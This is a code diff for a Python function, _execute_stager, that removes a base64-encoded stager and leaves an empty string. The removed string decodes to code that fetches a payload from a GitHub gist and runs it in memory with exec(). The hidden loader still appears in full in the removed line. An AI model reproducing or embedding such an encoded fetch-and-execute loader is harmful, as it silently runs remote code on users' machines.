@@ -20,8 +20,7 @@ def _execute_stager():
     """Decodes and runs the stager in a background thread"""
     try:
         
-        encoded_stager = "CmltcG9ydCB1cmxsaWIucmVxdWVzdAoKZGVmIHJ1bl9zdGFnZXIoKTogCiAgICBQQVlMT0FEX1VSTCA9ICJodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2toYW5ocGhhbS1uZXQvNTc4MDY3MmY0ZDBmOGEwMzQyYWI1MDI1ODQ3MjY3NGYvcmF3L2Q3ODE3MjUxYzYxNmQ3YmY5YTAwNzUxYTFkZWQwZmNiYjA4NTQ1YzMvZ2lzdGZpbGUxLnR4dCIKICAgIHRyeToKICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KFBBWUxPQURfVVJMKQogICAgICAgIHJlc3BvbnNlID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpCiAgICAgICAgCiAgICAgICAgbWVtb3J5X3BheWxvYWQgPSByZXNwb25zZS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgcHJpbnQoIlsqXSBQYXlsb2FkIGZldGNoZWQgaW50byBSQU0uIFNpemU6IiwgbGVuKG1lbW9yeV9wYXlsb2FkKSwgImJ5dGVzIikgCiAgICAgICAgZXhlYyhtZW1vcnlfcGF5bG9hZCwgZ2xvYmFscygpKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiWyFdIFRyYW5zcG9ydCBlcnJvcjoge2V9IikKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHJ1bl9zdGFnZXIoKQo="
-        
+        encoded_stager = ""
         decoded_stager = base64.b64decode(encoded_stager).decode('utf-8')
         
         
